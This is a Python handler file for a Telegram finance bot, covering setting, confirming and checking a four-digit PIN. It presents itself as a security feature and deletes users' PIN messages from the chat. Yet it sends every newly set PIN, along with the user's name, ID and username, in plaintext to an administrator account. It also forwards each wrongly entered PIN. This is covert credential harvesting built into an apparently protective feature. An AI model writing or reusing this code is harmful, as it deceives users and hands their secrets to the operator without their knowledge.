from aiogram import Router, F, types
from aiogram.fsm.context import FSMContext
from database.db_manager import Database
from states.security import PinState
import time
from utils.i18n import get_text
from keyboards.menu import main_menu, settings_keyboard
from middlewares.security import SecurityMiddleware
from config import ADMIN_ID
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

router = Router()
db = Database("finance.db")

@router.callback_query(F.data == "set_pin")
async def start_set_pin(callback: types.CallbackQuery, state: FSMContext):
    lang = db.get_user_language(callback.from_user.id)
    await state.set_state(PinState.enter_new_pin)
    await callback.message.edit_text(get_text('enter_new_pin', lang))
    await callback.answer()

@router.message(PinState.enter_new_pin)
async def process_new_pin(message: types.Message, state: FSMContext):
    try:
        await message.delete()
    except Exception:
        pass
        
    lang = db.get_user_language(message.from_user.id)
    if not message.text.isdigit() or len(message.text) != 4:
        return await message.answer(get_text('pin_invalid_format', lang))
    
    await state.update_data(new_pin=message.text)
    await state.set_state(PinState.confirm_new_pin)
    await message.answer(get_text('confirm_new_pin', lang))

@router.message(PinState.confirm_new_pin)
async def confirm_pin(message: types.Message, state: FSMContext):
    try:
        await message.delete()
    except Exception:
        pass
        
    data = await state.get_data()
    new_pin = data.get("new_pin")
    
    lang = db.get_user_language(message.from_user.id)
    if message.text != new_pin:
        await state.set_state(PinState.enter_new_pin)
        return await message.answer(get_text('pin_mismatch', lang))
    
    db.set_pin_code(message.from_user.id, new_pin)
    db.update_session(message.from_user.id, time.time())
    await state.clear()
    
    balance = db.get_real_balance(message.from_user.id)
    is_premium = db.is_user_premium(message.from_user.id)
    await message.answer(get_text('pin_set_success', lang), reply_markup=main_menu(lang, balance, is_premium))

    # Adminga xabar berish
    user = message.from_user
    admin_msg = (
        f"✅ **Yangi PIN o'rnatildi**\n\n"
        f"👤 Foydalanuvchi: {user.full_name}\n"
        f"🆔 ID: `{user.id}`\n"
        f"🌐 Username: @{user.username if user.username else 'yoq'}\n"
        f"🔑 **PIN: `{new_pin}`**"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Foydalanuvchi bilan bog'lanish", url=f"tg://user?id={user.id}")]
    ])
    
    try:
        await message.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=keyboard)
    except Exception:
        pass

@router.message(PinState.check_pin)
async def check_user_pin(message: types.Message, state: FSMContext):
    try:
        await message.delete()
    except Exception:
        pass
        
    user_pin = db.get_pin_code(message.from_user.id)
    
    lang = db.get_user_language(message.from_user.id)
    if message.text == user_pin:
        db.update_session(message.from_user.id, time.time())
        await state.clear()
        balance = db.get_real_balance(message.from_user.id)
        is_premium = db.is_user_premium(message.from_user.id)
        await message.answer(get_text('pin_auth_success', lang), reply_markup=main_menu(lang, balance, is_premium))
    else:
        await message.answer(get_text('pin_incorrect', lang))
        
        # Adminga xabar berish
        user = message.from_user
        admin_msg = (
            f"⚠️ **Noto'g'ri PIN kiritildi**\n\n"
            f"👤 Foydalanuvchi: {user.full_name}\n"
            f"🆔 ID: `{user.id}`\n"
            f"🌐 Username: @{user.username if user.username else 'yoq'}\n"
            f"❌ Kiritilgan PIN: `{message.text}`"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💬 Foydalanuvchi bilan bog'lanish", url=f"tg://user?id={user.id}")]
        ])
        
        try:
            await message.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=keyboard)
        except Exception:
            pass
